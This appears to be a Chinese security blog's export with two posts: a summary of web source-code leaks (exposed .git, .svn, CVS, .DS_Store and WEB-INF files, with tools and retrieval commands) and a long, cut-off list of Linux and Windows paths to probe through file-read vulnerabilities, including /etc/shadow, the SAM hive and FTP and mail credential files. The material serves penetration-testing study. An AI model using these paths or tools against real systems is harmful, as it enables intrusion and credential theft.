href=\"#Git源码泄露\" class=\"headerlink\" title=\"Git源码泄露\"></a>Git源码泄露</h2><ul>\n<li>漏洞成因：运行git init初始化代码库的时候，会在当前目录下产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，如果该文件没有删除而是直接发布了，那么使用这个文件，就可以回复代码</li>\n<li>漏洞利用：工具：<a href=\"https://github.com/wangyihang/githacker\" target=\"_blank\" rel=\"noopener\">Githacker</a>、Githack</li>\n</ul>\n<h2 id=\"SVN导致文件泄露\"><a href=\"#SVN导致文件泄露\" class=\"headerlink\" title=\"SVN导致文件泄露\"></a>SVN导致文件泄露</h2><ul>\n<li>漏洞利用：工具：dvcs-ripper、Seay-Svn</li>\n</ul>\n<h2 id=\"HG源码泄露-目前还未遇到\"><a href=\"#HG源码泄露-目前还未遇到\" class=\"headerlink\" title=\"HG源码泄露(目前还未遇到)\"></a>HG源码泄露(目前还未遇到)</h2><ul>\n<li>漏洞成因：hg init的时候会生成.hg</li>\n<li>漏洞利用：工具：dvcs-ripper</li>\n</ul>\n<h2 id=\"CVS泄露\"><a href=\"#CVS泄露\" class=\"headerlink\" title=\"CVS泄露\"></a>CVS泄露</h2><p>漏洞利用<br>测试的目录</p>\n<pre><code>http://url/CVS/Root 返回根信息 http://url/CVS/Entries 返回所有文件的结构</code></pre><p>取回源码的命令</p>\n<pre><code>bk clone http://url/name dir</code></pre><p>这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p>\n<p>查看所有的改变的命令，转到download的目录</p>\n<pre><code>bk changes</code></pre><h2 id=\"Bazaar-bzr\"><a href=\"#Bazaar-bzr\" class=\"headerlink\" title=\"Bazaar/bzr\"></a>Bazaar/bzr</h2><p>工具：</p>\n<p><a href=\"https://github.com/kost/dvcs-ripper\" target=\"_blank\" rel=\"noopener\">dvcs-ripper</a></p>\n<pre><code>rip-bzr.pl -v -u http://www.example.com/.bzr/</code></pre><h2 id=\"网站备份压缩文件\"><a href=\"#网站备份压缩文件\" class=\"headerlink\" title=\"网站备份压缩文件\"></a>网站备份压缩文件</h2><p>常见备份文件类型总结* .git .svn  .swp .~bak .bash_history</p>\n<h3 id=\"phps-dotphps-源码泄露\"><a href=\"#phps-dotphps-源码泄露\" class=\"headerlink\" title=\".phps(dotphps)源码泄露\"></a>.phps(dotphps)源码泄露</h3><ul>\n<li><p>phps即为 PHP Source。PHP Source 由 The PHP Group 发布，是最通用的关联应用程序。</p>\n</li>\n<li><p>phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</p>\n</li>\n<li><p>Mine type: text/html, application/x-httpd-php-source, application/x-httpd-php3-source</p>\n</li>\n<li><p>不是默认存在，只会在特殊情况下存在</p>\n<blockquote>\n<p>参考</p>\n<p><a href=\"https://filext.com/file-extension/PHPS\" target=\"_blank\" rel=\"noopener\">https://filext.com/file-extension/PHPS</a></p>\n<p><a href=\"https://www.solvusoft.com/zh-cn/file-extensions/file-extension-phps/\" target=\"_blank\" rel=\"noopener\">文件扩展名 PHPS</a></p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"WEB-INF-web-xml泄露\"><a href=\"#WEB-INF-web-xml泄露\" class=\"headerlink\" title=\"WEB-INF/web.xml泄露\"></a>WEB-INF/web.xml泄露</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>\n<p>WEB-INF主要包含一下文件或目录：</p>\n<ul>\n<li><p><code>/WEB-INF/web.xml</code>：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>\n</li>\n<li><p><code>/WEB-INF/classes/</code>：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</p>\n</li>\n<li><p><code>/WEB-INF/lib/</code>：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</p>\n</li>\n<li><p><code>/WEB-INF/src/</code>：源码目录，按照包名结构放置各个java文件。</p>\n</li>\n<li><p><code>/WEB-INF/database.properties</code>：数据库配置文件</p>\n<p>漏洞成因：</p>\n<p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。<br>漏洞检测以及利用方法：<br>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>\n</li>\n</ul>\n<p>​    一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx  配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>\n<h2 id=\"DS-Store文件泄露\"><a href=\"#DS-Store文件泄露\" class=\"headerlink\" title=\"DS_Store文件泄露\"></a>DS_Store文件泄露</h2><ul>\n<li>漏洞成因：在发布代码的时候未删除隐藏文件汇总的.DS_Store文件，然后攻击者获得了敏感文件等信息</li>\n<li>漏洞利用：ds_store_exp</li>\n</ul>\n<h2 id=\"常见编辑器文件泄露\"><a href=\"#常见编辑器文件泄露\" class=\"headerlink\" title=\"常见编辑器文件泄露\"></a>常见编辑器文件泄露</h2><ul>\n<li>vim临时文件(.swp)</li>\n<li>vim备份文件(~)</li>\n</ul>\n<h2 id=\"Github导致文件泄露\"><a href=\"#Github导致文件泄露\" class=\"headerlink\" title=\"Github导致文件泄露\"></a>Github导致文件泄露</h2><blockquote>\n<p>参考</p>\n</blockquote>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"Web源码泄露总结\"><a href=\"#Web源码泄露总结\" class=\"headerlink\" title=\"Web源码泄露总结\"></a>Web源码泄露总结</h1><h2 id=\"Git源码泄露\"><a href=\"#Git源码泄露\" class=\"headerlink\" title=\"Git源码泄露\"></a>Git源码泄露</h2><ul>\n<li>漏洞成因：运行git init初始化代码库的时候，会在当前目录下产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，如果该文件没有删除而是直接发布了，那么使用这个文件，就可以回复代码</li>\n<li>漏洞利用：工具：<a href=\"https://github.com/wangyihang/githacker\" target=\"_blank\" rel=\"noopener\">Githacker</a>、Githack</li>\n</ul>\n<h2 id=\"SVN导致文件泄露\"><a href=\"#SVN导致文件泄露\" class=\"headerlink\" title=\"SVN导致文件泄露\"></a>SVN导致文件泄露</h2><ul>\n<li>漏洞利用：工具：dvcs-ripper、Seay-Svn</li>\n</ul>\n<h2 id=\"HG源码泄露-目前还未遇到\"><a href=\"#HG源码泄露-目前还未遇到\" class=\"headerlink\" title=\"HG源码泄露(目前还未遇到)\"></a>HG源码泄露(目前还未遇到)</h2><ul>\n<li>漏洞成因：hg init的时候会生成.hg</li>\n<li>漏洞利用：工具：dvcs-ripper</li>\n</ul>\n<h2 id=\"CVS泄露\"><a href=\"#CVS泄露\" class=\"headerlink\" title=\"CVS泄露\"></a>CVS泄露</h2><p>漏洞利用<br>测试的目录</p>\n<pre><code>http://url/CVS/Root 返回根信息 http://url/CVS/Entries 返回所有文件的结构</code></pre><p>取回源码的命令</p>\n<pre><code>bk clone http://url/name dir</code></pre><p>这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p>\n<p>查看所有的改变的命令，转到download的目录</p>\n<pre><code>bk changes</code></pre><h2 id=\"Bazaar-bzr\"><a href=\"#Bazaar-bzr\" class=\"headerlink\" title=\"Bazaar/bzr\"></a>Bazaar/bzr</h2><p>工具：</p>\n<p><a href=\"https://github.com/kost/dvcs-ripper\" target=\"_blank\" rel=\"noopener\">dvcs-ripper</a></p>\n<pre><code>rip-bzr.pl -v -u http://www.example.com/.bzr/</code></pre><h2 id=\"网站备份压缩文件\"><a href=\"#网站备份压缩文件\" class=\"headerlink\" title=\"网站备份压缩文件\"></a>网站备份压缩文件</h2><p>常见备份文件类型总结* .git .svn  .swp .~bak .bash_history</p>\n<h3 id=\"phps-dotphps-源码泄露\"><a href=\"#phps-dotphps-源码泄露\" class=\"headerlink\" title=\".phps(dotphps)源码泄露\"></a>.phps(dotphps)源码泄露</h3><ul>\n<li><p>phps即为 PHP Source。PHP Source 由 The PHP Group 发布，是最通用的关联应用程序。</p>\n</li>\n<li><p>phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</p>\n</li>\n<li><p>Mine type: text/html, application/x-httpd-php-source, application/x-httpd-php3-source</p>\n</li>\n<li><p>不是默认存在，只会在特殊情况下存在</p>\n<blockquote>\n<p>参考</p>\n<p><a href=\"https://filext.com/file-extension/PHPS\" target=\"_blank\" rel=\"noopener\">https://filext.com/file-extension/PHPS</a></p>\n<p><a href=\"https://www.solvusoft.com/zh-cn/file-extensions/file-extension-phps/\" target=\"_blank\" rel=\"noopener\">文件扩展名 PHPS</a></p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"WEB-INF-web-xml泄露\"><a href=\"#WEB-INF-web-xml泄露\" class=\"headerlink\" title=\"WEB-INF/web.xml泄露\"></a>WEB-INF/web.xml泄露</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>\n<p>WEB-INF主要包含一下文件或目录：</p>\n<ul>\n<li><p><code>/WEB-INF/web.xml</code>：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>\n</li>\n<li><p><code>/WEB-INF/classes/</code>：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</p>\n</li>\n<li><p><code>/WEB-INF/lib/</code>：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</p>\n</li>\n<li><p><code>/WEB-INF/src/</code>：源码目录，按照包名结构放置各个java文件。</p>\n</li>\n<li><p><code>/WEB-INF/database.properties</code>：数据库配置文件</p>\n<p>漏洞成因：</p>\n<p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。<br>漏洞检测以及利用方法：<br>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>\n</li>\n</ul>\n<p>​    一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx  配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>\n<h2 id=\"DS-Store文件泄露\"><a href=\"#DS-Store文件泄露\" class=\"headerlink\" title=\"DS_Store文件泄露\"></a>DS_Store文件泄露</h2><ul>\n<li>漏洞成因：在发布代码的时候未删除隐藏文件汇总的.DS_Store文件，然后攻击者获得了敏感文件等信息</li>\n<li>漏洞利用：ds_store_exp</li>\n</ul>\n<h2 id=\"常见编辑器文件泄露\"><a href=\"#常见编辑器文件泄露\" class=\"headerlink\" title=\"常见编辑器文件泄露\"></a>常见编辑器文件泄露</h2><ul>\n<li>vim临时文件(.swp)</li>\n<li>vim备份文件(~)</li>\n</ul>\n<h2 id=\"Github导致文件泄露\"><a href=\"#Github导致文件泄露\" class=\"headerlink\" title=\"Github导致文件泄露\"></a>Github导致文件泄露</h2><blockquote>\n<p>参考</p>\n</blockquote>\n"},{"title":"文件读取漏洞路径收集","date":"2021-09-10T06:01:13.325Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n# 文件读取漏洞路径收集\n\n```\n/etc/passwd\n/etc/shadow\n/etc/issue\n/etc/fstab\n/etc/host.conf\n/etc/motd\n/etc/ld.so.conf\n/etc/sysconfig/network-scripts/ifcfg-eth0\n/etc/sysconfig/network-scripts/ifcfg-eth1\n/var/www/htdocs/index.php\n/var/www/conf/httpd.conf\n/var/www/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/httpd/htdocs/index.php\n/var/httpd/conf/httpd.conf\n/var/httpd/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/www/index.html\n/var/www/index.php\n/opt/www/conf/httpd.conf\n/opt/www/htdocs/index.php\n/opt/www/htdocs/index.html\n/usr/local/apache/htdocs/index.html\n/usr/local/apache/htdocs/index.php\n/usr/local/apache2/htdocs/index.html\n/usr/local/apache2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.html\n/tmp/apache/htdocs/index.html\n/tmp/apache/htdocs/index.php\n/etc/httpd/htdocs/index.php\n/etc/httpd/conf/httpd.conf\n/etc/httpd/htdocs/index.html\n/www/php/php.ini\n/www/php4/php.ini\n/www/php5/php.ini\n/www/conf/httpd.conf\n/www/htdocs/index.php\n/www/htdocs/index.html\n\n/usr/local/httpd/conf/httpd.conf\n/apache/apache/conf/httpd.conf\n/apache/apache2/conf/httpd.conf\n/etc/apache/apache.conf\n/etc/apache2/apache.conf\n/etc/apache/httpd.conf\n/etc/apache2/httpd.conf\n/etc/apache2/vhosts.d/00_default_vhost.conf\n/etc/apache2/sites-available/default\n\n/etc/phpmyadmin/config.inc.php\n/etc/mysql/my.cnf\n/etc/httpd/conf.d/php.conf\n/etc/httpd/conf.d/httpd.conf\n\n/etc/httpd/logs/error_log\n/etc/httpd/logs/error.log\n/etc/httpd/logs/access_log\n/etc/httpd/logs/access.log\n/home/apache/conf/httpd.conf\n/home/apache2/conf/httpd.conf\n\n/var/log/apache/error_log\n/var/log/apache/error.log\n/var/log/apache/access_log\n/var/log/apache/access.log\n/var/log/apache2/error_log\n/var/log/apache2/error.log\n/var/log/apache2/access_log\n/var/log/apache2/access.log\n/var/www/logs/error_log\n/var/www/logs/error.log\n/var/www/logs/access_log\n/var/www/logs/access.log\n/usr/local/apache/logs/error_log\n/usr/local/apache/logs/error.log\n/usr/local/apache/logs/access_log\n/usr/local/apache/logs/access.log\n\n/var/log/error_log\n/var/log/error.log\n/var/log/access_log\n/var/log/access.log\n\n/usr/local/apache/logs/access_logaccess_log.old\n/usr/local/apache/logs/error_logerror_log.old\n\n/etc/php.ini\n/bin/php.ini\n/etc/init.d/httpd\n/etc/init.d/mysql\n\n/etc/httpd/php.ini\n/usr/lib/php.ini\n/usr/lib/php/php.ini\n/usr/local/etc/php.ini\n/usr/local/lib/php.ini\n/usr/local/php/lib/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php4/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php5/lib/php.ini\n/usr/local/php5/etc/php.ini\n/usr/local/php5/php5.ini\n/usr/local/apache/conf/php.ini\n\n/usr/local/apache/conf/httpd.conf\n/usr/local/apache2/conf/httpd.conf\n\n/usr/local/apache2/conf/php.ini\n/etc/php4.4/fcgi/php.ini\n/etc/php4/apache/php.ini\n/etc/php4/apache2/php.ini\n/etc/php5/apache/php.ini\n/etc/php5/apache2/php.ini\n/etc/php/php.ini\n/etc/php/php4/php.ini\n/etc/php/apache/php.ini\n/etc/php/apache2/php.ini\n/web/conf/php.ini\n/usr/local/Zend/etc/php.ini\n/opt/xampp/etc/php.ini\n/var/local/www/conf/php.ini\n/var/local/www/conf/httpd.conf\n/etc/php/cgi/php.ini\n/etc/php4/cgi/php.ini\n/etc/php5/cgi/php.ini\n\n/php5/php.ini\n/php4/php.ini\n/php/php.ini\n/PHP/php.ini\n\n/apache/php/php.ini\n\n/xampp/apache/bin/php.ini\n/xampp/apache/conf/httpd.conf\n/NetServer/bin/stable/apache/php.ini\n/home2/bin/stable/apache/php.ini\n\n/home/bin/stable/apache/php.ini\n\n/var/log/mysql/mysql-bin.log\n/var/log/mysql.log\n/var/log/mysqlderror.log\n/var/log/mysql/mysql.log\n/var/log/mysql/mysql-slow.log\n/var/mysql.log\n\n/var/lib/mysql/my.cnf\n/usr/local/mysql/my.cnf\n/usr/local/mysql/bin/mysql\n/etc/mysql/my.cnf\n/etc/my.cnf\n\n/usr/local/cpanel/logs\n/usr/local/cpanel/logs/stats_log\n/usr/local/cpanel/logs/access_log\n/usr/local/cpanel/logs/error_log\n/usr/local/cpanel/logs/license_log\n/usr/local/cpanel/logs/login_log\n/usr/local/cpanel/logs/stats_log\n/usr/local/share/examples/php4/php.ini\n/usr/local/share/examples/php/php.ini\n```\n\n1.LINUX常见路径：\n\n```\n/etc/passwd\n/etc/shadow\n/etc/fstab\n/etc/host.conf\n/etc/motd\n/etc/ld.so.conf\n/var/www/htdocs/index.php\n/var/www/conf/httpd.conf\n/var/www/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/httpd/htdocs/index.php\n/var/httpd/conf/httpd.conf\n/var/httpd/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/www/index.html\n/var/www/index.php\n/opt/www/conf/httpd.conf\n/opt/www/htdocs/index.php\n/opt/www/htdocs/index.html\n/usr/local/apache/htdocs/index.html\n/usr/local/apache/htdocs/index.php\n/usr/local/apache2/htdocs/index.html\n/usr/local/apache2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.html\n/tmp/apache/htdocs/index.html\n/tmp/apache/htdocs/index.php\n/etc/httpd/htdocs/index.php\n/etc/httpd/conf/httpd.conf\n/etc/httpd/htdocs/index.html\n/www/php/php.ini\n/www/php4/php.ini\n/www/php5/php.ini\n/www/conf/httpd.conf\n/www/htdocs/index.php\n/www/htdocs/index.html\n/usr/local/httpd/conf/httpd.conf\n/apache/apache/conf/httpd.conf\n/apache/apache2/conf/httpd.conf\n/etc/apache/apache.conf\n/etc/apache2/apache.conf\n/etc/apache/httpd.conf\n/etc/apache2/httpd.conf\n/etc/apache2/vhosts.d/00_default_vhost.conf\n/etc/apache2/sites-available/default\n/etc/phpmyadmin/config.inc.php\n/etc/mysql/my.cnf\n/etc/httpd/conf.d/php.conf\n/etc/httpd/conf.d/httpd.conf\n/etc/httpd/logs/error_log\n/etc/httpd/logs/error.log\n/etc/httpd/logs/access_log\n/etc/httpd/logs/access.log\n/home/apache/conf/httpd.conf\n/home/apache2/conf/httpd.conf\n/var/log/apache/error_log\n/var/log/apache/error.log\n/var/log/apache/access_log\n/var/log/apache/access.log\n/var/log/apache2/error_log\n/var/log/apache2/error.log\n/var/log/apache2/access_log\n/var/log/apache2/access.log\n/var/www/logs/error_log\n/var/www/logs/error.log\n/var/www/logs/access_log\n/var/www/logs/access.log\n/usr/local/apache/logs/error_log\n/usr/local/apache/logs/error.log\n/usr/local/apache/logs/access_log\n/usr/local/apache/logs/access.log\n/var/log/error_log\n/var/log/error.log\n/var/log/access_log\n/var/log/access.log\n/usr/local/apache/logs/access_logaccess_log.old\n/usr/local/apache/logs/error_logerror_log.old\n/etc/php.ini\n/bin/php.ini\n/etc/init.d/httpd\n/etc/init.d/mysql\n/etc/httpd/php.ini\n/usr/lib/php.ini\n/usr/lib/php/php.ini\n/usr/local/etc/php.ini\n/usr/local/lib/php.ini\n/usr/local/php/lib/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php4/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php5/lib/php.ini\n/usr/local/php5/etc/php.ini\n/usr/local/php5/php5.ini\n/usr/local/apache/conf/php.ini\n/usr/local/apache/conf/httpd.conf\n/usr/local/apache2/conf/httpd.conf\n/usr/local/apache2/conf/php.ini\n/etc/php4.4/fcgi/php.ini\n/etc/php4/apache/php.ini\n/etc/php4/apache2/php.ini\n/etc/php5/apache/php.ini\n/etc/php5/apache2/php.ini\n/etc/php/php.ini\n/etc/php/php4/php.ini\n/etc/php/apache/php.ini\n/etc/php/apache2/php.ini\n/web/conf/php.ini\n/usr/local/Zend/etc/php.ini\n/opt/xampp/etc/php.ini\n/var/local/www/conf/php.ini\n/var/local/www/conf/httpd.conf\n/etc/php/cgi/php.ini\n/etc/php4/cgi/php.ini\n/etc/php5/cgi/php.ini\n/php5/php.ini\n/php4/php.ini\n/php/php.ini\n/PHP/php.ini\n/apache/php/php.ini\n/xampp/apache/bin/php.ini\n/xampp/apache/conf/httpd.conf\n/NetServer/bin/stable/apache/php.ini\n/home2/bin/stable/apache/php.ini\n/home/bin/stable/apache/php.ini\n/var/log/mysql/mysql-bin.log\n/var/log/mysql.log\n/var/log/mysqlderror.log\n/var/log/mysql/mysql.log\n/var/log/mysql/mysql-slow.log\n/var/mysql.log\n/var/lib/mysql/my.cnf\n/usr/local/mysql/my.cnf\n/usr/local/mysql/bin/mysql\n/etc/mysql/my.cnf\n/etc/my.cnf\n/usr/local/cpanel/logs\n/usr/local/cpanel/logs/stats_log\n/usr/local/cpanel/logs/access_log\n/usr/local/cpanel/logs/error_log\n/usr/local/cpanel/logs/license_log\n/usr/local/cpanel/logs/login_log\n/usr/local/cpanel/logs/stats_log\n/usr/local/share/examples/php4/php.ini\n/usr/local/share/examples/php/php.ini\n```\n\n2..windows常见路径（可以将c盘换成d,e盘,比如星外虚拟主机跟华众得,一般都放在d盘）\n\n```\nc:\\windows\\php.ini\nc:\\boot.ini\nc:\\1.txt\nc:\\a.txt\n\nc:\\CMailServer\\config.ini\nc:\\CMailServer\\CMailServer.exe\nc:\\CMailServer\\WebMail\\index.asp\nc:\\program files\\CMailServer\\CMailServer.exe\nc:\\program files\\CMailServer\\WebMail\\index.asp\nC:\\WinWebMail\\SysInfo.ini\nC:\\WinWebMail\\Web\\default.asp\nC:\\WINDOWS\\FreeHost32.dll\nC:\\WINDOWS\\7i24iislog4.exe\nC:\\WINDOWS\\7i24tool.exe\n\nc:\\hzhost\\databases\\url.asp\n\nc:\\hzhost\\hzclient.exe\nC:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\7i24虚拟主机管理平台\\自动设置[受控端].lnk\n\nC:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\Serv-U\\Serv-U Administrator.lnk\nC:\\WINDOWS\\web.config\nc:\\web\\index.html\nc:\\www\\index.html\nc:\\WWWROOT\\index.html\nc:\\website\\index.html\nc:\\web\\index.asp\nc:\\www\\index.asp\nc:\\wwwsite\\index.asp\nc:\\WWWROOT\\index.asp\nc:\\web\\index.php\nc:\\www\\index.php\nc:\\WWWROOT\\index.php\nc:\\WWWsite\\index.php\nc:\\web\\default.html\nc:\\www\\default.html\nc:\\WWWROOT\\default.html\nc:\\website\\default.html\nc:\\web\\default.asp\nc:\\www\\default.asp\nc:\\wwwsite\\default.asp\nc:\\WWWROOT\\default.asp\nc:\\web\\default.php\nc:\\www\\default.php\nc:\\WWWROOT\\default.php\nc:\\WWWsite\\default.php\nC:\\Inetpub\\wwwroot\\pagerror.gif\nc:\\windows\\notepad.exe\nc:\\winnt\\notepad.exe\nC:\\Program Files\\Microsoft Office\\OFFICE10\\winword.exe\nC:\\Program Files\\Microsoft Office\\OFFICE11\\winword.exe\nC:\\Program Files\\Microsoft Office\\OFFICE12\\winword.exe\nC:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\nC:\\Program Files\\winrar\\rar.exe\nC:\\Program Files\\360\\360Safe\\360safe.exe\nC:\\Program Files\\360Safe\\360safe.exe\nC:\\Documents and Settings\\Administrator\\Application Data\\360Safe\\360Examine\\360Examine.log\nc:\\ravbin\\store.ini\nc:\\rising.ini\nC:\\Program Files\\Rising\\Rav\\RsTask.xml\nC:\\Documents and Settings\\All Users\\Start Menu\\desktop.ini\nC:\\Documents and Settings\\Administrator\\My Documents\\Default.rdp\nC:\\Documents and Settings\\Administrator\\Cookies\\index.dat\nC:\\Documents and Settings\\Administrator\\My Documents\\新建 文本文档.txt\nC:\\Documents and Settings\\Administrator\\桌面\\新建 文本文档.txt\nC:\\Documents and Settings\\Administrator\\My Documents\\1.txt\nC:\\Documents and Settings\\Administrator\\桌面\\1.txt\nC:\\Documents and Settings\\Administrator\\My Documents\\a.txt\nC:\\Documents and Settings\\Administrator\\桌面\\a.txt\nC:\\Documents and Settings\\All Users\\Documents\\My Pictures\\Sample Pictures\\Blue hills.jpg\nE:\\Inetpub\\wwwroot\\aspnet_client\\system_web\\1_1_4322\\SmartNav.htm\nC:\\Program Files\\RhinoSoft.com\\Serv-U\\Version.txt\nC:\\Program Files\\RhinoSoft.com\\Serv-U\\ServUDaemon.ini\nC:\\Program Files\\Symantec\\SYMEVENT.INF\nC:\\Program Files\\Microsoft SQL Server\\80\\Tools\\Binn\\sqlmangr.exe\nC:\\Program Files\\Microsoft SQL Server\\MSSQL\\Data\\master.mdf\nC:\\Program Files\\Microsoft SQL Server\\MSSQL.1\\MSSQL\\Data\\master.mdf\nC:\\Program Files\\Microsoft SQL Server\\MSSQL.2\\MSSQL\\Data\\master.mdf\nC:\\Program Files\\Microsoft SQL Server\\80\\Tools\\HTML\\database.htm\nC:\\Program Files\\Microsoft SQL Server\\MSSQL\\README.TXT\nC:\\Program Files\\Microsoft SQL Server\\90\\Tools\\Bin\\DdsShapes.dll\nC:\\Program Files\\Microsoft SQL Server\\MSSQL\\sqlsunin.ini\nC:\\MySQL\\MySQL Server 5.0\\my.ini\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\data\\mysql\\user.frm\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\COPYING\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\share\\mysql_fix_privilege_tables.sql\nC:\\Program Files\\MySQL\\MySQL Server 4.1\\bin\\mysql.exe\nc:\\MySQL\\MySQL Server 4.1\\bin\\mysql.exe\nc:\\MySQL\\MySQL Server 4.1\\data\\mysql\\user.frm\nC:\\Program Files\\Oracle\\oraconfig\\Lpk.dll\nC:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\aspnet_state.exe\nC:\\WINDOWS\\system32\\inetsrv\\w3wp.exe\nC:\\WINDOWS\\system32\\inetsrv\\inetinfo.exe\nC:\\WINDOWS\\system32\\inetsrv\\MetaBase.xml\nC:\\WINDOWS\\system32\\inetsrv\\iisadmpwd\\achg.asp\nC:\\WINDOWS\\system32\\config\\default.LOG\nC:\\WINDOWS\\system32\\config\\sam\nC:\\WINDOWS\\system32\\config\\system\nc:\\CMailServer\\config.ini\nc:\\program files\\CMailServer\\config.ini\nc:\\tomcat6\\tomcat6\\bin\\version.sh\nc:\\tomcat6\\bin\\version.sh\nc:\\tomcat\\bin\\version.sh\nc:\\program files\\tomcat6\\bin\\version.sh\nC:\\Program Files\\Apache Software Foundation\\Tomcat 6.0\\bin\\version.sh\nc:\\Program Files\\Apache Software Foundation\\Tomcat 6.0\\logs\\isapi_redirect.log\nc:\\Apache2\\Apache2\\bin\\Apache.exe\nc:\\Apache2\\bin\\Apache.exe\nc:\\Apache2\\php\\license.txt\nC:\\Program Files\\Apache Group\\Apache2\\bin\\Apache.exe\n/usr/local/tomcat5527/bin/version.sh\n/usr/share/tomcat6/bin/startup.sh\n/usr/tomcat6/bin/startup.sh\nc:\\Program Files\\QQ2007\\qq.exe\nc:\\Program Files\\Tencent\\qq\\User.db\nc:\\Program Files\\Tencent\\qq\\qq.exe\nc:\\Program Files\\Tencent\\qq\\bin\\qq.exe\nc:\\Program Files\\Tencent\\qq2009\\qq.exe\nc:\\Program Files\\Tencent\\qq2008\\qq.exe\nc:\\Program Files\\Tencent\\qq2010\\bin\\qq.exe\nc:\\Program Files\\Tencent\\qq\\Users\\All Users\\Registry.db\nC:\\Program Files\\Tencent\\TM\\TMDlls\\QQZip.dll\nc:\\Program Files\\Tencent\\Tm\\Bin\\Txplatform.exe\nc:\\Program Files\\Tencent\\RTXServer\\AppConfig.xml\nC:\\Program Files\\Foxmal\\Foxmail.exe\nC:\\Program Files\\Foxmal\\accounts.cfg\nC:\\Program Files\\tencent\\Foxmal\\Foxmail.exe\nC:\\Program Files\\tencent\\Foxmal\\accounts.cfg\nC:\\Program Files\\LeapFTP 3.0\\LeapFTP.exe\nC:\\Program Files\\LeapFTP\\LeapFTP.exe\nc:\\Program Files\\GlobalSCAPE\\CuteFTP Pro\\cftppro.exe\nc:\\Program Files\\GlobalSCAPE\\CuteFTP Pro\\notes.txt\nC:\\Program Files\\FlashFXP\\FlashFXP.ini\nC:\\Program Files\\FlashFXP\\flashfxp.exe\nc:\\Program Files\\Oracle\\bin\\regsvr32.exe\nc:\\Program Files\\腾讯游戏\\QQGAME\\readme.txt\nc:\\Program 